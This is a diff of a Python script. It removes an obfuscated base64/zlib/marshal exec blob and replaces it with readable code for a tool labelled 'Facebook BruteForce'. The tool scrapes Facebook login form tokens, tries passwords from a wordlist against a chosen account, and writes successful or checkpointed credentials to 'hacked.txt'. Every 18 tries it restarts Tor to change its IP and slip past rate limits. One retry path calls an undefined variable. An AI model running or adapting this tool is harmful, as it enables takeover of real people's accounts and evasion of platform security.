@@ -1,2 +1,139 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+#coding: utf-8
+import os.path
+import requests,json,re
+import sys,os,time
+logo=""" \033[1;92m_____              _                 _
+|  ___|_ _  ___ ___| |__   ___   ___ | | __
+| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
+|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
+|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
+BruteForce by Darius:"""
+if sys.version_info[0] != 3:
+  os.system('clear')
+  print(logo)
+  print(65 * '\033[1;92m=')
+  print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n''')
+  print(65 * '\033[1;92m=')
+  sys.exit()
+len_pass=0
+MIN_PASSWORD_LENGTH = 6
+POST_URL = 'https://www.facebook.com/login.php'
+HEADERS = {'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
+BODY = {}
+COOKIES = {}
+## ang pag gaya sa code na ito ay hindi magiging dahilan para tawaging kang coder bigyan moko ng credit sa pag gaya mo at matutuwa pako
+## copying this code will not be a reason to call you a coder give me credit for copying and I'll be happy
+def create_form():
+    form = dict()
+    cookies = {'fr': '0IMUuWXccH2pkzP45.AWUFdV5Dgg4VhLNhaLFw5FPobiA.Bid6Iv.mO.AAA.0.0.BigPLT.AWWg4f-WBVM','dpr': '3','locale': 'tl_PH','m_pixel_ratio': '3'}
+    try:
+      data = requests.get(POST_URL, headers=HEADERS)
+    except:
+      create_form()
+    try:
+      for cookie in data.cookies:
+        cookies[cookie.name]=cookie.value
+      action_url= re.findall(r'method="post" action="(.*?)"',data.text).pop(0)
+      value=re.findall(r'value="(.*?)"',data.text)
+      form['lsd']=value[0]
+      form['jazoest']=value[1]
+      form['m_ts']=value[2]
+      form['li']=value[3]
+      form['try_number']=value[4]
+      form['unrecognized_tries']=value[5]
+      form['login']=value[6]
+      form['bi_xrwh']=value[10]
+      return form, cookies, action_url
+    except:
+      create_form()
+
+
+def na_hack_naba(email, index, password):
+    global BODY, COOKIES
+    BODY, COOKIES, URL = create_form()
+    BODY['email'] = email
+    BODY['pass'] = password
+    try:
+      r = requests.post('https://m.facebook.com{}'.format(str(URL)), data=BODY, cookies=COOKIES, headers=HEADERS)
+    except:
+      na_hack_naba(email, index, password)
+    try:
+      if "c_user" in r.cookies:
+        open('hacked.txt', 'a').write(str(email+' | '+password))
+        print(65 * '\033[1;92m=')
+        print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
+        print(65 * '\033[1;92m=')
+        return True
+      elif len(r.cookies) == 0:
+        open('hacked.txt', 'a').write(str(email+' | '+password))
+        print(65 * '\033[1;92m=')
+        print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
+        print(65 * '\033[1;92m=')
+        return True
+      elif "checkpoint" in r.cookies or "checkpoint_title" in r.text:
+        open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password))
+        print(65 * '\033[1;92m=')
+        print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
+        print(65 * '\033[1;92m=')
+        return True
+    except:
+      na_hack_naba(emai, index, password)
+    return False
+
+def change_ip():
+  try:
+    old=requests.get('http://checkip.amazonaws.com/')
+  except:
+    pass
+  while True:
+    try:
+      x=os.system('killall -HUP tor')
+      time.sleep(3)
+      ip=requests.get('http://checkip.amazonaws.com/')
+    except:
+      pass
+    try:
+      if old.text==ip.text:
+        pass
+      else:
+        return ip.text
+    except:
+      pass
+  
+if __name__ == "__main__":
+  os.system('reset')
+  os.system('clear')
+  print(logo)
+  print(65 * '\033[1;92m=')
+  print('\033[1;92mEmail/Username/Id/etc:')
+  email = input('\033[1;94m==\033[1;92m>>> \033[1;91m').strip()
+  print('\033[1;92m[+] Password File:')
+  PASSWORD_FILE = input('\033[1;94m==\033[1;92m>>> \033[1;91m')
+  if not os.path.isfile(PASSWORD_FILE):
+    print("Password file not exist: ")
+    sys.exit(0)
+  else:
+    try:
+      password_data = open(PASSWORD_FILE, 'r').read().split("\n")
+    except:
+      print('\033[1;91m[!] Error reading file')
+      sys.exit(1)
+    print('\033[1;92m[+] Passwords Number {}'.format(str(len(password_data))))
+    print('\033[1;92m[+] \033[1;91mPlease use Tor')
+    print(65 * '\033[1;92m=')
+    for index, password in zip(range(password_data.__len__()), password_data):
+        password = password.strip()
+        if len(password) < MIN_PASSWORD_LENGTH:
+            continue
+        elif int(len_pass)==18:
+          print(65 * '\033[1;92m=')
+          ip=change_ip()
+          try:
+            print('\033[1;92m[+] New phone: \033[;97m{}'.format(str(ip)))
+          except:
+            pass
+          len_pass=0
+        len_pass+=1
+        print("\033[1;92mTrying password [ "+str(index)+" ]: \033[1;97m"+str(password))
+        if na_hack_naba(email, index, password):
+            break
